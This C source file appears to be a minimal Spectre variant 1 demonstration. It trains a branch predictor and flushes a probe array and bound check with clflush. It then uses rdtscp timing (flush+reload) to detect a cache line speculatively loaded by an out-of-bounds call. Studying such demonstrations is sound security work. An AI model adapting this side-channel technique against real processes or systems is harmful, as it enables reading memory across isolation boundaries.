#include <emmintrin.h>
#include <x86intrin.h>

#include <stdio.h>
#include <stdint.h>

#define IDX_STEP    (512)
#define OFFSET      (1024)
#define NELEMS      (256)
#define THR	(100)

uint8_t secret = 59;
uint8_t dummy;

uint8_t secrets[256];
uint8_t array[NELEMS * IDX_STEP];

int size = 50;

static void victim(int idx)
{
    if (idx < size)
        // dummy = array[idx*IDX_STEP + OFFSET];
        dummy = array[secrets[idx]*IDX_STEP + OFFSET];
}

int main(int argc, const char **argv)
{
    for (int i = 0; i < 120; i++)
        secrets[i] = i/2;

    unsigned buf;

    // Init array - load to RAM, deal with copy-on-write
    for (int i = 0; i < NELEMS; i++)
        array[i*IDX_STEP + OFFSET] = 1;

    // Flush it from the memory
    for (int i = 0; i < NELEMS; i++)
        _mm_clflush(&array[i*IDX_STEP + OFFSET]);

    // Train predictor
    for (int idx = 0; idx < size; idx++)
        victim(idx);

    // Flush array from the memory again (always before the start)
    for (int i = 0; i < NELEMS; i++)
        _mm_clflush(&array[i*IDX_STEP + OFFSET]);

    // Force branch prediction
    _mm_clflush(&size);

    // It shouldn't work, i.e. the function should not use the
    // requested address.
    victim(secret);

    // ...or did it work?
    for (int i = 0; i < NELEMS; i++)
    {
        uint64_t start, finish;
        start  = __rdtscp(&buf);
        uint8_t a = array[i*IDX_STEP + OFFSET];
        finish = __rdtscp(&buf);

        uint64_t duration = finish - start;
        if (duration < THR)
        	printf("%3d : %lu\n", i, duration);
    }

    return 0;
}

